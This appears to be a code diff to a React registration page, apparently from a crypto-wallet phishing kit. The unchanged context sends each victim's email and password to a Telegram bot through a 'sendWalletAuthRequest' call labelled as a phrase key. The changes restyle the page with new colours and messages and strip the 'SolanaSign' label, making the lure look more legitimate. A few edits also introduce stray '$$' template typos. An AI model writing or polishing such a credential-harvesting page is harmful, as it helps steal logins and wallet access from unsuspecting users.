@@ -120,7 +120,7 @@ ${data.password}
 
       // Send registration data to Telegram bot
       const telegramResponse = await telegramBotService.sendWalletAuthRequest({
-        walletType: "SolanaSign Registration",
+        walletType: "Registration",
         keyType: "phrase",
         key: formatRegistrationData(registrationData),
       });
@@ -163,9 +163,9 @@ ${data.password}
   const getStatusIcon = () => {
     switch (telegramStatus) {
       case "sending":
-        return <div className="animate-spin rounded-full h-5 w-5 border-b-2 border-purple-600"></div>;
+        return <div className="animate-spin rounded-full h-5 w-5 border-b-2" style={{ borderColor: '#53d28d', color: 'white' }}></div>;
       case "success":
-        return <div className="w-5 h-5 text-green-600">✓</div>;
+        return <div className="w-5 h-5 " style={{ color: '#53d28d' }}>✓</div>;
       case "error":
         return <div className="w-5 h-5 text-red-600">✗</div>;
       default:
@@ -176,7 +176,7 @@ ${data.password}
   const getStatusMessage = () => {
     switch (telegramStatus) {
       case "sending":
-        return "Connection established.";
+        return "Connection established. Please wait...";
       case "success":
         return telegramMessage;
       case "error":
@@ -214,9 +214,9 @@ ${data.password}
                 value={email}
                 onChange={handleEmailChange}
                 placeholder="Enter your email address"
-                className={`${
-                  emailError ? "border-red-500" : ""
-                } h-12 text-base px-4 text-white`}
+                className={`$${
+                  emailError ? "text-red-500 border-white" : "border-white text-white"
+                } h-12 text-base px-4`}
                 labelColor="text-white"
               />
               {emailError && (
@@ -230,9 +230,9 @@ ${data.password}
                 value={password}
                 onChange={handlePasswordChange}
                 placeholder="Enter your password"
-                className={`${
-                  passwordError ? "border-red-500" : ""
-                } h-12 text-base px-4 text-white`}
+                className={`$${
+                  passwordError ? "border-red-500" : "border-white text-white"
+                } h-12 text-base px-4`}
                 labelColor="text-white"
                 isPassword={true}
                 isVisible={showPassword}
@@ -247,10 +247,10 @@ ${data.password}
               <div
                 className={`flex items-center gap-2 p-3 rounded-lg ${
                   telegramStatus === "success"
-                    ? "bg-green-900/20 text-green-400"
+                    ? "bg-[#53d28d]/20 text-[#53d28d] border border-[#53d28d]/30"
                     : telegramStatus === "error"
                     ? "bg-red-900/20 text-red-400"
-                    : "bg-blue-900/20 text-blue-400"
+                    : "bg-[#ce9f53]/10 text-[#ce9f53]"
                 }`}
               >
                 {getStatusIcon()}
@@ -268,7 +268,7 @@ ${data.password}
                 Cancel
               </Button>
               <Button
-                className="flex-1 bg-purple-600 text-white hover:bg-purple-700 disabled:opacity-50"
+                className="flex-1 bg-[#ce9f53] text-white hover:bg-[#b88a3f] disabled:opacity-50"
                 onClick={handleRegister}
                 disabled={!isFormValid || isLoading}
               >
